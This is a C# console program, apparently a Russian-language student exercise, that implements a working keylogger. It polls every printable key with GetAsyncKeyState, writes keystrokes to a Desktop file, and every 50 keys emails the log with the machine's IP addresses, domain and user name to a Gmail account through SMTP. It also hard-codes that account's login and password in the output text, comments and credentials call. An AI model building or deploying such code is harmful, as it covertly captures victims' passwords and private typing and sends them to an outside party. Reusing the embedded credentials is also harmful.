using Microsoft.SqlServer.Server;
using System;
using System.Collections.Generic;
using System.Diagnostics.Tracing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;


namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static long  longnumberOfKeyStrokes = 0;

        static void Main(string[] args)
        {

            Console.WriteLine("KeyLogger. Который при запуске начинает считывать все нажатые клавиши.\n\n" +
                "Все нажатые клавиши заносятся в файл keyStrokes.txt.\n" +
                "Файл создается в папке Desktop (На рабочем столе)\n\n" +
                "Через каждые 50 нажатых символов сообщение скидывается на почту gmail\n" +
                "С информацией о всех нажатых клавишах\n\n");

            Console.WriteLine("________Почта gmail________\nЛогин: krem.labss@gmail.com\n" +
                "Пароль: Krem1234\n\n");

            Console.Write("Нажатые клавиши: ");


            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }

            string path = (folderPath + @"\keyStrokes.txt");

            
            if (File.Exists(path))  
            {
                using (StreamWriter streamWriter = File.CreateText(path))
                {
                    
                }
            }

            while (true)
            {
                Thread.Sleep(130);

                for(int i = 32; i < 127; i++)
                {
                    int keyPressed = GetAsyncKeyState(i);

                    if (keyPressed != 0)
                    {
                        Console.Write((char) i + " ");

                        using (StreamWriter streamWriter = File.AppendText(path))
                        {
                            streamWriter.Write((char) i);
                        }

                        longnumberOfKeyStrokes++;

                        if (longnumberOfKeyStrokes % 50 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }
            }
        }


        // Отправка сообщения на почту gmail
        // Логин: krem.labss@gmail.com
        // Пароль: Krem1234d

        static void SendNewMessage()
        {
            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            string filePath = folderName + @"\keyStrokes.txt";

            string logData = File.ReadAllText(filePath);
            string emailBody = "";

            DateTime timeNow = DateTime.Now;
            string subject = "Message from KeyLogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach(var address in host.AddressList)
            {
                emailBody += "Address: " + address;
                
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + timeNow.ToString();
            emailBody += logData;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);

            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("krem.labss@gmail.com");
            mailMessage.To.Add("krem.labss@gmail.com");

            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;

            client.Credentials = new System.Net.NetworkCredential("krem.labss@gmail.com", "Krem1234");

            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}
